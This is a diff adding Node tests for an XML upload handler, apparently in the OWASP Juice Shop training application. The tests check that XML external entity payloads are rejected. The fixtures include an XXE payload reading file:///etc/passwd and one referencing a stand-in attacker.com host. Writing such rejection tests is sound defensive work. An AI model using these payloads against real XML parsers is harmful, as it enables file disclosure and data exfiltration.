@@ -7,7 +7,7 @@ import { describe, it, beforeEach } from 'node:test'
 import assert from 'node:assert/strict'
 import { challenges } from '../../data/datacache'
 import { type Challenge } from '@juice-shop/data/types'
-import { checkUploadSize, checkFileType } from '../../routes/fileUpload'
+import { checkUploadSize, checkFileType, handleXmlUpload } from '../../routes/fileUpload'
 
 void describe('fileUpload', () => {
   let req: any
@@ -61,5 +61,74 @@ void describe('fileUpload', () => {
     checkFileType(req, res, () => {})
 
     assert.equal(challenges.uploadTypeChallenge.solved, false)
+  })
+
+  void describe('handleXmlUpload', () => {
+    it('should reject XML with external entities (SYSTEM)', async () => {
+      challenges.deprecatedInterfaceChallenge = { solved: false, save } as unknown as Challenge
+      req.file.originalname = 'malicious.xml'
+      req.file.buffer = Buffer.from(`<?xml version="1.0"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<foo>&xxe;</foo>`)
+      let statusCalledWith = 0
+      res.status = (code: number) => {
+        statusCalledWith = code
+        return res
+      }
+
+      let errorPassed: Error | undefined
+      await handleXmlUpload(req, res, (err?: any) => {
+        errorPassed = err
+      })
+
+      assert.equal(statusCalledWith, 410)
+      assert.ok(errorPassed instanceof Error)
+      assert.match(errorPassed.message, /forbidden external entity/i)
+    })
+
+    it('should reject XML with external entities (PUBLIC)', async () => {
+      challenges.deprecatedInterfaceChallenge = { solved: false, save } as unknown as Challenge
+      req.file.originalname = 'malicious_public.xml'
+      req.file.buffer = Buffer.from(`<?xml version="1.0"?>
+<!DOCTYPE foo [ <!ENTITY xxe PUBLIC "public_id" "http://attacker.com/evt"> ]>
+<foo>&xxe;</foo>`)
+      let statusCalledWith = 0
+      res.status = (code: number) => {
+        statusCalledWith = code
+        return res
+      }
+
+      let errorPassed: Error | undefined
+      await handleXmlUpload(req, res, (err?: any) => {
+        errorPassed = err
+      })
+
+      assert.equal(statusCalledWith, 410)
+      assert.ok(errorPassed instanceof Error)
+      assert.match(errorPassed.message, /forbidden external entity/i)
+    })
+
+    it('should allow normal XML through to the XML parser', async () => {
+      challenges.deprecatedInterfaceChallenge = { solved: false, save } as unknown as Challenge
+      challenges.xxeFileDisclosureChallenge = { solved: false, save } as unknown as Challenge
+      req.file.originalname = 'normal.xml'
+      req.file.buffer = Buffer.from(`<?xml version="1.0"?>
+<foo>bar</foo>`)
+      let statusCalledWith = 0
+      res.status = (code: number) => {
+        statusCalledWith = code
+        return res
+      }
+
+      let errorPassed: Error | undefined
+      await handleXmlUpload(req, res, (err?: any) => {
+        errorPassed = err
+      })
+
+      assert.equal(statusCalledWith, 410)
+      assert.ok(errorPassed instanceof Error)
+      assert.match(errorPassed.message, /deprecated for security reasons/i)
+      assert.ok(!errorPassed.message.includes('forbidden external entity'))
+    })
   })
 })
